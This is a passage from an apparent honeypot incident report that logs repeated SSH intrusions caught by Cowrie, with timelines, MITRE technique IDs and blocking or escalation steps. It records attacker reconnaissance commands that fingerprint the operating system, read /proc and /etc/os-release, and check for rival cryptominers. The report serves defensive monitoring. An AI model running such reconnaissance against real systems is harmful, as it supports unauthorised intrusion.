- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda7761ccdd9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:29 |
| **Last Seen** | 2026-09-29 01:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:29:48` | `cowrie.session.connect` |
| `2026-09-29 01:29:48` | `cowrie.client.version` |
| `2026-09-29 01:29:48` | `cowrie.client.kex` |
| `2026-09-29 01:29:49` | `cowrie.login.success` |
| `2026-09-29 01:29:49` | `cowrie.session.params` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.success` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:49` | `cowrie.command.input` |
| `2026-09-29 01:29:50` | `cowrie.log.closed` |
| `2026-09-29 01:29:50` | `cowrie.session.params` |
| `2026-09-29 01:29:50` | `cowrie.command.input` |
| `2026-09-29 01:29:51` | `cowrie.log.closed` |
| `2026-09-29 01:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b388d4b45e9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:31 |
| **Last Seen** | 2026-09-29 01:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:31:37` | `cowrie.session.connect` |
| `2026-09-29 01:31:37` | `cowrie.client.version` |
| `2026-09-29 01:31:38` | `cowrie.client.kex` |
| `2026-09-29 01:31:38` | `cowrie.login.success` |
| `2026-09-29 01:31:39` | `cowrie.session.params` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.success` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:39` | `cowrie.log.closed` |
| `2026-09-29 01:31:39` | `cowrie.session.params` |
| `2026-09-29 01:31:39` | `cowrie.command.input` |
| `2026-09-29 01:31:40` | `cowrie.log.closed` |
| `2026-09-29 01:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9449b28e7a70

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:33 |
| **Last Seen** | 2026-09-29 01:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:33:23` | `cowrie.session.connect` |
| `2026-09-29 01:33:23` | `cowrie.client.version` |
| `2026-09-29 01:33:23` | `cowrie.client.kex` |
| `2026-09-29 01:33:24` | `cowrie.login.success` |
| `2026-09-29 01:33:25` | `cowrie.session.params` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.success` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.command.input` |
| `2026-09-29 01:33:25` | `cowrie.log.closed` |
| `2026-09-29 01:33:27` | `cowrie.session.params` |
| `2026-09-29 01:33:27` | `cowrie.command.input` |
| `2026-09-29 01:33:27` | `cowrie.log.closed` |
| `2026-09-29 01:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6861152898

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:34 |
| **Last Seen** | 2026-09-29 01:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:34:46` | `cowrie.session.connect` |
| `2026-09-29 01:34:46` | `cowrie.client.version` |
| `2026-09-29 01:34:46` | `cowrie.client.kex` |
| `2026-09-29 01:34:47` | `cowrie.login.success` |
| `2026-09-29 01:34:48` | `cowrie.session.params` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.success` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:48` | `cowrie.command.input` |
| `2026-09-29 01:34:49` | `cowrie.log.closed` |
| `2026-09-29 01:34:50` | `cowrie.session.params` |
| `2026-09-29 01:34:50` | `cowrie.command.input` |
| `2026-09-29 01:34:50` | `cowrie.log.closed` |
| `2026-09-29 01:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dcab18a11a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:36 |
| **Last Seen** | 2026-09-29 01:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:36:07` | `cowrie.session.connect` |
| `2026-09-29 01:36:07` | `cowrie.client.version` |
| `2026-09-29 01:36:07` | `cowrie.client.kex` |
| `2026-09-29 01:36:08` | `cowrie.login.success` |
| `2026-09-29 01:36:09` | `cowrie.session.params` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.success` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.command.input` |
| `2026-09-29 01:36:09` | `cowrie.log.closed` |
| `2026-09-29 01:36:10` | `cowrie.session.params` |
| `2026-09-29 01:36:10` | `cowrie.command.input` |
| `2026-09-29 01:36:11` | `cowrie.log.closed` |
| `2026-09-29 01:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b099ea2231

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:37 |
| **Last Seen** | 2026-09-29 01:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:37:29` | `cowrie.session.connect` |
| `2026-09-29 01:37:29` | `cowrie.client.version` |
| `2026-09-29 01:37:29` | `cowrie.client.kex` |
| `2026-09-29 01:37:30` | `cowrie.login.success` |
| `2026-09-29 01:37:31` | `cowrie.session.params` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.success` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.command.input` |
| `2026-09-29 01:37:31` | `cowrie.log.closed` |
| `2026-09-29 01:37:32` | `cowrie.session.params` |
| `2026-09-29 01:37:32` | `cowrie.command.input` |
| `2026-09-29 01:37:32` | `cowrie.log.closed` |
| `2026-09-29 01:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ddb4eeb9dbb

| Field | Detail |
|---|---|
| **Source IP** | `189.223.176[.]45` |
| **First Seen** | 2026-09-29 01:37 |
| **Last Seen** | 2026-09-29 01:39 |
| **Session Duration** | 135s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:37:33` | `cowrie.session.connect` |
| `2026-09-29 01:37:33` | `cowrie.client.version` |
| `2026-09-29 01:37:33` | `cowrie.client.kex` |
| `2026-09-29 01:37:34` | `cowrie.login.failed` |
| `2026-09-29 01:37:35` | `cowrie.login.success` |
| `2026-09-29 01:37:36` | `cowrie.session.params` |
| `2026-09-29 01:37:36` | `cowrie.command.input` |
| `2026-09-29 01:37:36` | `cowrie.command.failed` |
| `2026-09-29 01:37:36` | `cowrie.log.closed` |
| `2026-09-29 01:37:37` | `cowrie.session.params` |
| `2026-09-29 01:37:37` | `cowrie.command.input` |
| `2026-09-29 01:37:37` | `cowrie.log.closed` |
| `2026-09-29 01:37:37` | `cowrie.session.params` |
| `2026-09-29 01:37:37` | `cowrie.command.input` |
| `2026-09-29 01:37:37` | `cowrie.log.closed` |
| `2026-09-29 01:37:38` | `cowrie.session.params` |
| `2026-09-29 01:37:38` | `cowrie.command.input` |
| `2026-09-29 01:37:38` | `cowrie.log.closed` |
| `2026-09-29 01:37:39` | `cowrie.session.params` |
| `2026-09-29 01:37:39` | `cowrie.command.input` |
| `2026-09-29 01:37:39` | `cowrie.log.closed` |
| `2026-09-29 01:37:40` | `cowrie.session.params` |
| `2026-09-29 01:37:40` | `cowrie.command.input` |
| `2026-09-29 01:37:40` | `cowrie.log.closed` |
| `2026-09-29 01:37:40` | `cowrie.session.params` |
| `2026-09-29 01:37:40` | `cowrie.command.input` |
| `2026-09-29 01:37:41` | `cowrie.log.closed` |
| `2026-09-29 01:37:41` | `cowrie.session.params` |
| `2026-09-29 01:37:41` | `cowrie.command.input` |
| `2026-09-29 01:37:41` | `cowrie.log.closed` |
| `2026-09-29 01:37:42` | `cowrie.session.params` |
| `2026-09-29 01:37:42` | `cowrie.command.input` |
| `2026-09-29 01:37:42` | `cowrie.log.closed` |
| `2026-09-29 01:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.223.176[.]45` to AbuseIPDB if not already reported
- [ ] Block `189.223.176[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a920e7572f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:38 |
| **Last Seen** | 2026-09-29 01:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:38:54` | `cowrie.session.connect` |
| `2026-09-29 01:38:54` | `cowrie.client.version` |
| `2026-09-29 01:38:54` | `cowrie.client.kex` |
| `2026-09-29 01:38:54` | `cowrie.login.success` |
| `2026-09-29 01:38:56` | `cowrie.session.params` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.success` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.command.input` |
| `2026-09-29 01:38:56` | `cowrie.log.closed` |
| `2026-09-29 01:38:57` | `cowrie.session.params` |
| `2026-09-29 01:38:57` | `cowrie.command.input` |
| `2026-09-29 01:38:57` | `cowrie.log.closed` |
| `2026-09-29 01:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a88c8958aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:40 |
| **Last Seen** | 2026-09-29 01:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:40:26` | `cowrie.session.connect` |
| `2026-09-29 01:40:26` | `cowrie.client.version` |
| `2026-09-29 01:40:26` | `cowrie.client.kex` |
| `2026-09-29 01:40:27` | `cowrie.login.success` |
| `2026-09-29 01:40:28` | `cowrie.session.params` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.success` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:28` | `cowrie.log.closed` |
| `2026-09-29 01:40:28` | `cowrie.session.params` |
| `2026-09-29 01:40:28` | `cowrie.command.input` |
| `2026-09-29 01:40:29` | `cowrie.log.closed` |
| `2026-09-29 01:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c802b84dd94f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:42 |
| **Last Seen** | 2026-09-29 01:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:42:09` | `cowrie.session.connect` |
| `2026-09-29 01:42:09` | `cowrie.client.version` |
| `2026-09-29 01:42:09` | `cowrie.client.kex` |
| `2026-09-29 01:42:09` | `cowrie.login.success` |
| `2026-09-29 01:42:10` | `cowrie.session.params` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.success` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.command.input` |
| `2026-09-29 01:42:10` | `cowrie.log.closed` |
| `2026-09-29 01:42:11` | `cowrie.session.params` |
| `2026-09-29 01:42:11` | `cowrie.command.input` |
| `2026-09-29 01:42:11` | `cowrie.log.closed` |
| `2026-09-29 01:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d192d49bcc5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:43 |
| **Last Seen** | 2026-09-29 01:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 01:43:53` | `cowrie.session.connect` |
| `2026-09-29 01:43:53` | `cowrie.client.version` |
| `2026-09-29 01:43:53` | `cowrie.client.kex` |
| `2026-09-29 01:43:53` | `cowrie.login.success` |
| `2026-09-29 01:43:54` | `cowrie.session.params` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.success` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.command.input` |
| `2026-09-29 01:43:54` | `cowrie.log.closed` |
| `2026-09-29 01:43:55` | `cowrie.session.params` |
| `2026-09-29 01:43:55` | `cowrie.command.input` |
| `2026-09-29 01:43:56` | `cowrie.log.closed` |
| `2026-09-29 01:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-235b2ef2ab6a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-29 01:45 |
| **Last Seen** | 2026-09-29 01:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
